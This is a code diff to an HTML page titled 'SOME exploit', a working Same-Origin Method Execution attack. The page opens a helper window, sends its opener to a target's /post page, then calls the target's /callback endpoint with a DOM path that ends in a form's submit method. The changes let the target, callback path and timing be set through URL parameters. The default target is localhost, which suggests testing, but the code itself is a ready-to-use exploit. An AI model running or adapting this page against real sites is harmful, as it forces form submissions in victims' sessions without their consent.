@@ -2,26 +2,33 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>SOME</title>
+  <title>SOME exploit</title>
 </head>
 <body>
 <script>
-const target = 'http://127.0.0.1:8001';
-const callbackPath = 'opener.document.body.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.submit';
+const params = new URLSearchParams(window.location.search);
+const target = params.get('target') || 'http://127.0.0.1:8001';
+const callbackPath = params.get('callbackPath') ||
+  'opener.document.body.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.submit';
+const navDelay = Number(params.get('navDelay') || 500);
+const callbackDelay = Number(params.get('callbackDelay') || 4000);
+
 const helper = window.open('', '_blank');
 if (helper) {
   helper.document.write(`<!doctype html><script>
-    const target = '${target}';
-    const cb = '${callbackPath}';
+    const target = ${JSON.stringify(target)};
+    const cb = ${JSON.stringify(callbackPath)};
+    const delay = ${callbackDelay};
     setTimeout(() => {
       location = target + '/callback?callback=' + encodeURIComponent(cb);
-    }, 1500);
-  <\/script>`);
+    }, delay);
+  <\\/script>`);
   helper.document.close();
 }
+
 setTimeout(() => {
   window.location = target + '/post';
-}, 300);
+}, navDelay);
 </script>
 </body>
 </html>
